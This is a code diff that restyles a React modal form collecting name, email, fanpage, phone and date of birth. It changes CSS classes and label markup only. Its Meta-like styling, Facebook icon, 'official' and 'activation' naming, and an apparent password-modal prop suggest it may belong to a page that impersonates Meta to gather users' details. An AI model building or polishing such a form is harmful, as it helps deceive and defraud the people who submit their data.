@@ -84,8 +84,12 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
     }
   };
 
-  const inputClass = (field: string) => `mv-input input w-full border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[11px] rounded-[10px] bg-meta-surface text-[14px] text-meta-text mb-[10px] transition-all duration-200`;
-  const dobInputClass = (field: string) => `mv-input input w-full min-w-0 border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[6px] sm:px-[11px] rounded-[10px] bg-meta-surface text-[14px] text-meta-text transition-all duration-200`;
+  const inputClass = (field: string) =>
+    `mv-input mv-activation-input input w-full border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[11px] rounded-[10px] bg-white text-[14px] text-meta-text mb-[10px] transition-all duration-200`;
+  const dobInputClass = (field: string) =>
+    `mv-input mv-activation-input input w-full min-w-0 border ${errors[field] ? 'border-red-500' : 'border-meta-border'} h-[40px] px-[6px] sm:px-[11px] rounded-[10px] bg-white text-[14px] text-meta-text transition-all duration-200`;
+  const labelClass = 'mv-activation-label mb-[6px] block text-[13px] font-semibold';
+  const requiredMark = <span className="mv-activation-required">*</span>;
   const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[13px] mt-[-5px] mb-[10px]">{errors[field]}</p>;
   const dobErrorText = (field: string) => errors[field] && <p className="text-red-500 text-[11px] leading-tight mt-[4px] sm:text-[12px]">{errors[field]}</p>;
   const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
@@ -99,16 +103,19 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
       isOpen={isOpen}
       title={t.info.title}
       onClose={handleClose}
+      panelClassName="mv-official-modal mv-activation-modal"
+      titleClassName="mv-modal-title"
+      backdropClassName="mv-official-backdrop"
     >
       <div className="flex min-h-full min-w-0 w-full flex-col">
         <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
           <div className='w-full'>
-            <div className='mb-[14px] rounded-[12px] border border-meta-border-light bg-meta-bg px-[12px] py-[10px]'>
-              <p className='text-[13px] leading-[1.55] text-meta-text-secondary'>
+            <div className='mv-activation-hint mb-[14px] rounded-[12px] border px-[12px] py-[10px]'>
+              <p className='text-[13px] leading-[1.55]'>
                 {t.info.hint}
               </p>
             </div>
-            <label htmlFor='fullName' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.fullName} <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='fullName' className={labelClass}>{t.info.fullName} {requiredMark}</label>
             <div className={inputClass('fullName')}>
               <input
                 type="text"
@@ -121,7 +128,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fullName')}
 
-            <label htmlFor='email' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.email} <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='email' className={labelClass}>{t.info.email} {requiredMark}</label>
             <div className={inputClass('email')}>
               <input
                 type="email"
@@ -134,7 +141,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('email')}
 
-            <label htmlFor='emailBusiness' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.emailBiz}</label>
+            <label htmlFor='emailBusiness' className={labelClass}>{t.info.emailBiz}</label>
             <div className={inputClass('emailBusiness')}>
               <input
                 type="email"
@@ -147,7 +154,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('emailBusiness')}
 
-            <label htmlFor='fanpage' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.fanpage} <span className='text-[#e5484d]'>*</span></label>
+            <label htmlFor='fanpage' className={labelClass}>{t.info.fanpage} {requiredMark}</label>
             <div className={inputClass('fanpage')}>
               <input
                 type="text"
@@ -160,8 +167,8 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
             {errorText('fanpage')}
 
-            <label className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.phone} <span className='text-[#e5484d]'>*</span></label>
-            <div className={`mv-input input w-full border ${errors.phone ? 'border-red-500' : 'border-meta-border'} h-[40px] rounded-[10px] bg-meta-surface text-[14px] mb-[10px]`}>
+            <label className={labelClass}>{t.info.phone} {requiredMark}</label>
+            <div className={`mv-input mv-activation-input input w-full border ${errors.phone ? 'border-red-500' : 'border-meta-border'} h-[40px] rounded-[10px] bg-white text-[14px] mb-[10px]`}>
               <PhoneInput
                 country={formData.country_code?.toLowerCase() || "us"}
                 value={formData.phone}
@@ -179,7 +186,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             {errorText('phone')}
 
             <div>
-              <b className='text-meta-text text-[13px] font-semibold mb-[7px] block'>{t.info.dob} <span className='text-[#e5484d]'>*</span></b>
+              <b className={`${labelClass} mb-[7px]`}>{t.info.dob} {requiredMark}</b>
             </div>
             <div className="mb-[10px] grid grid-cols-[minmax(0,0.85fr)_minmax(0,0.85fr)_minmax(0,1.3fr)] gap-[6px] sm:grid-cols-3 sm:gap-[10px]">
               <div className="min-w-0">
@@ -235,8 +242,8 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
 
             </div>
 
-            <label htmlFor='message' className='mb-[6px] block text-[13px] font-semibold text-meta-text'>{t.info.message}</label>
-            <div className={`mv-input input w-full border border-meta-border h-[100px] px-[11px] py-[11px] rounded-[10px] bg-meta-surface text-[14px] mb-[10px]`}>
+            <label htmlFor='message' className={labelClass}>{t.info.message}</label>
+            <div className="mv-input mv-activation-input input w-full border border-meta-border h-[100px] px-[11px] py-[11px] rounded-[10px] bg-white text-[14px] mb-[10px]">
               <textarea
                 id='message'
                 className="w-full outline-0 h-full resize-none"
@@ -246,7 +253,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               />
             </div>
 
-            <div className='mb-[15px] overflow-hidden rounded-[12px] border border-meta-border-light bg-meta-surface shadow-[0_1px_3px_rgba(28,30,33,0.06)]'>
+            <div className='mv-activation-notify mb-[15px] overflow-hidden rounded-[12px] border shadow-[0_1px_3px_rgba(0,100,224,0.06)]'>
               <div className='flex items-center gap-[14px] px-[14px] py-[13px]'>
                 <img
                   src='/images/icons/ic_facebook.svg'
@@ -275,10 +282,10 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
             </div>
 
             <div className='mt-[15px] mb-[20px]'>
-              <label className='cursor-pointer flex items-center gap-[5px] text-[14px]' htmlFor="custom-checkbox">
+              <label className='cursor-pointer flex items-center gap-[5px] text-[14px] text-meta-text-secondary' htmlFor="custom-checkbox">
                 <CustomCheckbox />
                 {t.info.agree}{' '}
-                <span className='text-meta-blue hover:underline'>
+                <span className='text-meta-blue font-medium hover:underline'>
                   {t.info.agreeTerms}{' '}
                   <img
                     src="/images/icons/ic_reject.svg"
@@ -289,7 +296,7 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
               </label>
             </div>
             <div className='w-full mt-[20px] '>
-              <button type='submit' className='mv-btn-primary w-full min-h-[48px] text-white rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px] active:opacity-90'>{t.info.submit}</button>
+              <button type='submit' className='mv-btn-activation w-full min-h-[48px] text-white rounded-[40px] flex items-center justify-center cursor-pointer font-semibold text-[15px] tracking-[0.01em] transition-[filter,transform] duration-200 active:scale-[0.995]'>{t.info.submit}</button>
             </div>
           </div>
 
